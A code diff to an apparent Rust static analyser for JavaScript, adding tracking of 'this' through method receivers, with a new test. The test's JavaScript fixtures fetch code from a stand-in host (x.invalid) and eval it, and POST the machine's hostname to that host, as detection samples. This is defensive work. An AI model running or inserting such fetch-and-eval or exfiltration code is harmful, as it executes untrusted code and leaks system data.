@@ -2648,6 +2648,27 @@ impl<'p> Eval<'p> {
         out
     }
 
+    /// Is one of `fids` a method of a class made in several places (descs::Program::sc_made_widely)?
+    fn sc_widely_method(&mut self, fids: &[FnId]) -> bool {
+        fids.iter().any(|&f| match self.p.fns[f as usize].cls {
+            Some(c) => self.p.sc_made_widely(c),
+            None => false,
+        })
+    }
+
+    /// supply mode: `this`, in a method of a class made in several places: the method's receiver (RECV_INDEX), as
+    /// a parameter, which a call on an instance gives the instance's value (B-3: `r.setCode(t); r.run()`, where
+    /// `run` evals `this.c`, runs what `r` was given; B-1 keeps such a class's instances apart, so its `this.x` holds
+    /// nothing a call on an instance gives). Nothing elsewhere.
+    pub(super) fn sc_this_value(&mut self, scope: ScopeId) -> V {
+        let method = self.p.method_fn(scope);
+        let cls = self.p.fns[method as usize].cls;
+        match cls {
+            Some(c) if self.p.sc_made_widely(c) => V::param(method as u64 * PARAM_BASE + RECV_INDEX as u64, 0, false, 0),
+            _ => V::empty(),
+        }
+    }
+
     /// A method call on an instance (not on `this`) of a class made in
     /// several places (descs::Program::sc_made_widely)?
     fn sc_instance_call(&mut self, callee: NodeId, fids: &[FnId]) -> bool {
@@ -2879,10 +2900,10 @@ impl<'p> Eval<'p> {
                 }
             }
         }
-        // a member of `this`
+        // a member of `this` (and, in a method of a class made in several places, of the receiver: B-3)
         if !computed {
             if let Some(b) = self.sc_this_member(node, scope) {
-                return Some(self.read(b));
+                return Some(self.read(b).union(&obj.plain()));
             }
         }
         // a copy of the environment, a value holding it or a parameter, read by a member's name (`{ ...process.env
@@ -3080,7 +3101,12 @@ impl<'p> Eval<'p> {
         let held = if own { recv.plain().through_member() } else { recv.plain() };
         let mut v;
         if !fids.is_empty() {
+            // (a method of a class made in several places: `this` is the value it is called on, B-3)
+            if member && self.sc_widely_method(&fids) {
+                self.recv_val = Some(recv.plain());
+            }
             v = self.apply(node, &fids, args, spread, line, false);
+            self.recv_val = None;
             if !definite {
                 let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
                 v = v.union(&union_all(&plains)).union(&held);
@@ -3842,6 +3868,26 @@ mod tests {
             post("JSON.stringify(r.all())")
         );
         assert_eq!(sent(&src), None);
+    }
+
+    #[test]
+    fn a_method_reads_this_as_its_receiver() {
+        // B-3: in a class made in several places (B-1 keeps its instances apart), what one method of an instance was
+        // given reaches what another method of that instance does with it, and no other instance's
+        let class = "class R {\n  setCode(t) { this.c = t; }\n  run() { eval(this.c); }\n}\n";
+        let made = "const a = new R();\nconst b = new R();\n";
+        let get = "const https = require('https');\nhttps.get('https://x.invalid/c', (res) => {\n  let d = '';\n  \
+                   res.on('data', (c) => { d += c; });\n  res.on('end', () => { a.setCode(d); a.run(); });\n});\n";
+        assert_eq!(runs(&format!("{}{}{}", class, made, get)), Some("run"));
+        assert_eq!(runs(&format!("{}{}{}", class, made, get.replace("a.run()", "b.run()"))), None);
+        // through another method of its own
+        let via = class.replace("  run() {", "  go() { this.run(); }\n  run() {");
+        assert_eq!(runs(&format!("{}{}{}", via, made, get.replace("a.run()", "a.go()"))), Some("run"));
+        // and what it sends
+        let class = "class S {\n  keep(v) { this.v = v; }\n  send() { fetch('https://x.invalid/c', { method: 'POST', body: this.v }); }\n}\n";
+        let src = format!("{}const a = new S();\nconst b = new S();\na.keep(require('os').hostname());\na.send();\n", class);
+        assert_eq!(sent(&src), found("identity", "hostname"));
+        assert_eq!(sent(&src.replace("a.send()", "b.send()")), None);
     }
 
     #[test]
